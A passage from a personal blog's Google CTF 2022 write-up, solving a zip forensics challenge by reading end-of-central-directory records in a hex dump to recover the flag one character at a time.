<li>To get the flag n-th character, we need to know which flag{n}.zip is the correct zip. If we found it, that means the content of its zip is the n-th character of our flag</li>
</ul>
<p>But how do we know the correct zip file? Reading through the <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" target="_blank" rel="noopener noreffer ">appnote.txt</a> of the ZIP file, we can understand how the ZIP signatures work, especially in part 4.3.1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   4.3.1 A ZIP file MUST contain an &#34;end of central directory record&#34;. A ZIP 
</span></span><span class="line"><span class="cl">   file containing only an &#34;end of central directory record&#34; is considered an 
</span></span><span class="line"><span class="cl">   empty ZIP file.  Files MAY be added or replaced within a ZIP file, or deleted. 
</span></span><span class="line"><span class="cl">   A ZIP file MUST have only one &#34;end of central directory record&#34;.  Other 
</span></span><span class="line"><span class="cl">   records defined in this specification MAY be used as needed to support 
</span></span><span class="line"><span class="cl">   storage requirements for individual ZIP files.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check the signature of the end of the central directory record</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   4.3.16  End of central directory record:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      end of central dir signature    4 bytes  (0x06054b50)
</span></span><span class="line"><span class="cl">      number of this disk             2 bytes
</span></span><span class="line"><span class="cl">      number of the disk with the
</span></span><span class="line"><span class="cl">      start of the central directory  2 bytes
</span></span><span class="line"><span class="cl">      total number of entries in the
</span></span><span class="line"><span class="cl">      central directory on this disk  2 bytes
</span></span><span class="line"><span class="cl">      total number of entries in
</span></span><span class="line"><span class="cl">      the central directory           2 bytes
</span></span><span class="line"><span class="cl">      size of the central directory   4 bytes
</span></span><span class="line"><span class="cl">      offset of start of central
</span></span><span class="line"><span class="cl">      directory with respect to
</span></span><span class="line"><span class="cl">      the starting disk number        4 bytes
</span></span><span class="line"><span class="cl">      .ZIP file comment length        2 bytes
</span></span><span class="line"><span class="cl">      .ZIP file comment       (variable size)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the signature is started by 0x06054b50. Searching this pattern in HxD, turn out it gives 21 results.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 00 EE 00 00 CC 00 00 00 B8 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 93 D7 00 00 65 17 00 00 8C 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 CC CA 00 00 42 24 00 00 76 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 69 BF 00 00 BB 2F 00 00 60 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 CE B6 00 00 6C 38 00 00 4A 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 29 A5 00 00 27 4A 00 00 34 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 E7 9C 00 00 7F 52 00 00 1E 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 42 8B 00 00 3A 64 00 00 08 01
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 21 86 00 00 71 69 00 00 F2 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 71 73 00 00 37 7C 00 00 DC 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 66 70 00 00 58 7F 00 00 C6 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 E3 59 00 00 F1 95 00 00 B0 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 AC 52 00 00 3E 9D 00 00 9A 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 A2 47 00 00 5E A8 00 00 84 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 8E 33 00 00 88 BC 00 00 6E 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 9A 2A 00 00 92 C5 00 00 58 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 16 1C 00 00 2C D4 00 00 42 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 38 15 00 00 20 DB 00 00 2C 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 2F 02 00 00 3F EE 00 00 16 00
</span></span><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 34 F0 00 00 50 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>This makes sense, as technically, there is 21 zip in the given file.</p>
<ul>
<li>dump.zip contains hello.txt</li>
<li>a zip contains hi.txt</li>
<li>19 zips flag{n}.zip</li>
</ul>
<p>With this end of the central directory, we can know which zip is the correct one. Notice that each end of the central directory has 4-bytes which is the offset of the start of the central directory of the file. With this, we can know which zip is the correct one for each n-th character of the flag.</p>
<p>Example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">50 4B 05 06 00 00 00 00 01 00 01 00 5A E4 00 00 88 0A 00 00 A2 01
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Checking the 0A88-0x1 offset, it refers to the correct char of the flag, which is C 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/XRl4QHd.png"
        data-srcset="https://i.imgur.com/XRl4QHd.png, https://i.imgur.com/XRl4QHd.png 1.5x, https://i.imgur.com/XRl4QHd.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/XRl4QHd.png"
        title="https://i.imgur.com/XRl4QHd.png" /></p>
<p>Doing the same to the rest of the signatures, we got the flag.</p>
<blockquote>
<p>Flag: <code>CTF{p0s7m0d3rn_z1p}</code></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/google-ctf-2022/" data-title="Google CTF 2022" data-via="Chovid99" data-hashtags="Writeup,Google CTF,pwn,aslr,buffer overflow,rop,oob,prng,zip,forensic,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/google-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/google-ctf/">Google CTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/aslr/">aslr</a>,&nbsp;<a href="/tags/buffer-overflow/">buffer overflow</a>,&nbsp;<a href="/tags/rop/">rop</a>,&nbsp;<a href="/tags/oob/">oob</a>,&nbsp;<a href="/tags/prng/">PRNG</a>,&nbsp;<a href="/tags/zip/">zip</a>,&nbsp;<a href="/tags/forensic/">forensic</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/typhooncon-ctf-2022/" class="prev" rel="prev" title="TyphoonCon CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>TyphoonCon CTF 2022</a>
            <a href="/posts/maplectf-2022/" class="next" rel="next" title="MapleCTF 2022">MapleCTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
